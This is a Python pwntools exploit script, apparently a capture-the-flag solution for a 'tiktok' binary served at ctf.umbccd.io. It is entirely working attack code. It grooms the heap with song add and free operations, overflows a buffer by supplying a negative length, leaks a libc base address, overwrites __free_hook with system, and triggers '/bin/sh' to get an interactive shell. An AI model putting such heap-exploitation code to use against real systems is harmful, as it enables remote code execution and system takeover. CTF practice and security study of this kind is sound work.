from pwn import *

e = ELF("./tiktok")
libc = ELF("./libc-2.27.so")

context.binary = e.path

if "--remote" in sys.argv:
  p = remote("ctf.umbccd.io", 4700)
else:
  p = process(e.path)

for i in range(0x2e - 2 - 3):
  p.sendlineafter("Choice:", "1")
  p.sendlineafter("path.", "Animal".ljust(8, "\x00") + p64(0x21) + p64(e.symbols["songs"] + 0x38 * 21 + 0x18)[:7])

for i in range(2):
  p.sendlineafter("Choice:", "1")
  p.sendlineafter("path.", "Animal/blahblah.txt") # 42 / 43

p.sendlineafter("Choice:", "1")
p.sendafter("path.", "Animal".ljust(0x18, "/")) # 44

def free(idx):
  p.sendlineafter("Choice:", "4")
  p.sendlineafter("Choice:", str(idx))

def play(idx):
  p.sendlineafter("Choice:", "3")
  p.sendlineafter("Choice:", str(idx))

play(1)
play(2)

play(43)

play(3)
play(4)
play(5)

play(31)
play(32)
play(33)
play(34)

play(35)
play(36)

free(31)
free(32)
free(33)
free(34)

free(2)
free(1)

p.sendlineafter(":", "3")
p.sendlineafter(":", "44")
p.sendline("-1")
p.sendline("A" * 0x18 
  + p64(0x21) + p64(e.symbols["songs"] + 0x38 * 20 + 0x10) + "\x00" * 0x10
  + p64(0x691).ljust(0x690, "\x00")
  + p64(0x21).ljust(0x20, "\x00")
  + p64(0x21)
)

free(43)


play(42)
play(3) # leak

p.recvuntil("You Selected: (null) from Animal")
p.recvline()

leak = u64(p.recvline(keepends=False).ljust(8, "\x00")) - 0x7f20cd07eca0 + 0x00007f20ccc93000 
print(hex(leak))


play(11)
play(12)
play(13)

free(12)

play(22)
p.sendline("-1")
p.sendline("\x00" * 0x28
  + ("\x00" * 0x18 + p64(0) + p64(e.symbols["songs"]) + p64(0) + p64(0)) * 5)

free(36)
free(35)

play(22)
p.sendline("-1")
p.sendline("\x00" * 0x18 + p64(0x21) + p64(leak + libc.symbols["__free_hook"] - 8))

play(37)

play(23)
p.sendline("-1")
p.sendline("/bin/sh\x00" + p64(leak + libc.symbols["system"]))

free(23)


p.interactive()
